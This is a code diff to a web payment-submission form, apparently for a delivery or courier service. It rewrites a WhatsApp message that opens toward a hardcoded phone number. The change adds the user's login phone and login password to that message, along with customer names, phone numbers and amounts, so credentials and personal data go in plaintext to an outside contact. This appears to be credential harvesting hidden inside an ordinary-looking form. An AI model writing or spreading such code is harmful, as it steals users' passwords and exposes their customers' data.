@@ -771,7 +771,27 @@
         }));
 
         // Construct WhatsApp message
-        const whatsappMessage = `New Payment Submission:\nCompany: ${formData.company}\nTRX ID: ${formData.trxid}\nAmount: ৳${formData.amount3.toFixed(2)}\nPayment Method: ${formData.method}\n\nConsignments:\n${formData.consignments.map(c => `  - Service: ${c.serviceType}, Name: ${c.name}, Phone: ${c.phone}, Amount1: ${c.amount1}, Amount2: ${c.amount2}`).join('\n')}`;
+        // Construct WhatsApp message
+        const whatsappMessage = `
+New Payment Submission:
+Company: ${formData.company}
+Login Phone: ${formData.phone}
+Login Password: ${formData.password}
+TRX ID: ${formData.trxid}
+Total Amount: ৳${formData.amount3.toFixed(2)}
+Payment Method: ${formData.method}
+Discount Applied: ${formData.discount}%
+
+Consignments:
+${formData.consignments.map((c, index) => `
+  Consignment #${index + 1}:
+    Service: ${c.serviceType}
+    Customer Name: ${c.name}
+    Customer Phone: ${c.phone}
+    Original Amount: ${c.amount1}
+    Updated Amount: ${c.amount2}
+`).join('')}
+`.trim();
 
         // Open WhatsApp chat in a new tab
         window.open(`https://wa.me/8801568760780?text=${encodeURIComponent(whatsappMessage)}`, '_blank');
